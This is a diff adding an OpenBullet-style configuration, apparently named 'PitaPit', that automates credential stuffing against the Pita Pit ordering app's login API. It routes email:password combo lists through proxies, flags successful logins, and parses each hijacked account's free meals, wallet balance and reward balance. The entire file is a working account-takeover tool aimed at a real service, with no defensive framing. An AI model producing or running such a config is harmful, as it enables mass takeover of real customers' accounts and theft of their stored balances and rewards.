@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "PitaPit",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-02T13:46:00.4662425-04:00",
+  "AdditionalInfo": "",
+  "Author": "Howzi",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://pita-pit.api.unoapp.io/api/app/user/login" 
+  CONTENT "{\"user_name\":\"<USER>\",\"password\":\"<PASS>\",\"app_version\":\"2.0\",\"platform\":\"web\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "auth-token: undefined" 
+  HEADER "Origin: https://order.pitapit.ca" 
+  HEADER "Referer: https://order.pitapit.ca/" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "\"code\":200" 
+  KEYCHAIN Failure OR 
+    KEY "\"code\":400" 
+PARSE "<SOURCE>" LR "\"free_meal\":" ",\"" -> CAP "free_meal" 
+PARSE "<SOURCE>" LR "\"wallet_balance\":" ",\"" -> CAP "wallet_balance" 
+PARSE "<SOURCE>" LR "\"reward_balance\":" ",\"" -> CAP "reward_balance" 
